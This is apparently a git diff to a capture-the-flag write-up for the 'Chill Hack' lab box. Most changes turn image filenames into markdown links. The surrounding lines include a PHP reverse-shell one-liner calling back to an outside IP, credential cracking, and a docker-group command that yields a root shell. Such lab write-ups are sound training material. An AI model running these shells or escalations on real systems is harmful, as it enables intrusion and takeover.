@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-chill.png
+![chill.png](../assets/chill_hack_assets/chill.png)
 
 ### Enumeration
 
@@ -98,7 +98,7 @@ ftp> bye
 221 Goodbye.
 ```
 
-note.png
+![note.png](../assets/chill_hack_assets/note.png)
 
 Ok, not sure exactly what to do with this just yet, so lets keep enumerating. Also of interest here is we now have two possible usernames: Anurodh & Apaar.
 
@@ -106,13 +106,15 @@ Lets move on and check ot HTTP.
 
 Navigating to the site we find a simple webpage:
 
-page.png
+![page.png](../assets/chill_hack_assets/page.png)
 
 Kicking off a feroxbuster scan against the target, we find a `/secret` directory. This is obviously worth checking out.
 
-secret_dir.png
+![secret_dir.png](../assets/chill_hack_assets/secret_dir.png)
 
 Ok interesting, looks like we have a way to execute commands here. Here, I entered the command `id` and got results back. We chould be able to exploit this to get a reverse shell back.
+
+![id.png](../assets/chill_hack_assets/id.png)
 
 ### Exploitation
 
@@ -125,7 +127,7 @@ php -r '$sock=fsockopen("10.6.61.45",443);exec("sh <&3 >&3 2>&3");'
 ```
 and got back the following:
 
-hacker.png
+![hacker.png](../assets/chill_hack_assets/hacker.png)
 
 This must be what the note found on FTP was referring to when it talked about filtering certain strings. Lets keep trying other one-liners.
 
@@ -217,17 +219,17 @@ echo "Thank you for your precious time!"
 
 Cool, we should be able to get some execution here:
 
-su.png
+![su.png](../assets/chill_hack_assets/su.png)
 
 Nice, we are now user apaar and can grab the local.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/chill_hack_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Browsing around the box a bit I found the file `/var/www/files/index.php` which had some hard coded mysql credentials.
 
-mysql_creds.png
+![mysql_creds.png](../assets/chill_hack_assets/mysql_creds.png)
 
 Lets use these to access the database:
 
@@ -287,9 +289,9 @@ Nice! We've discovered more credentials.
 
 We can crack these in https://crackstation.net/:
 
-crack.png
+![crack.png](../assets/chill_hack_assets/crack.png)
 
-Unfortunately, I wasn't able to do anything with these credentials.
+Unfortunately, I wasn't able to really do anything with these credentials.
 
 Going back to `/var/www/files` I find a file called hacker.php which contained:
 
@@ -305,6 +307,8 @@ Interesting, going to the `Images` folder I find the image referenced above.
 
 I can transfer the image back to my machine for inspection by starting a python http server on the target and use wget from my local machine to copy the file.
 
+![transfer.png)](../assets/chill_hack_assets/transfer.png)
+
 Based on the note, it seems we may need to extract some hidden data in the image. Lets use steghide:
 
 ```text
@@ -318,7 +322,7 @@ Ah, tricky. I was prompted for a passphrase, but was simply able to hit enter an
 
 The zip file was also password protected, but simply hitting enter didn't work for us this time. We'll need to brute force this using JohntheRipper.
 
-crackme.png
+![crackme.png](../assets/chill_hack_assets/crackme.png)
 
 Cool, John was able to crack the password nearly instantly and we can use the credential to unzip and read the file:
 
@@ -335,7 +339,7 @@ Archive:  backup.zip
 
 Looks like we've discovered yet another credential. 
 
-subl_pass.png
+![subl_pass.png](../assets/chill_hack_assets/subl_pass.png)
 
 Lets see if we can decode this:
 
@@ -354,9 +358,9 @@ anurodh@ubuntu:/var/www/files/images$ whoami
 anurodh
 ```
 
-Running `id` as this user we can see they are in the Docker group. THis should make for an easy privesc to root:
+Running `id` as this user we can see they are in the Docker group. This should make for an easy privesc to root:
 
-docker.png
+![docker.png](../assets/chill_hack_assets/docker.png)
 
 Copying the command from GTFObins we can run:
 
@@ -365,7 +369,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 Which gives a root shell. From there all we need to do is grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/chill_hack_assets/root_flag.png)
 
 And that's that. Thanks for following along!
 
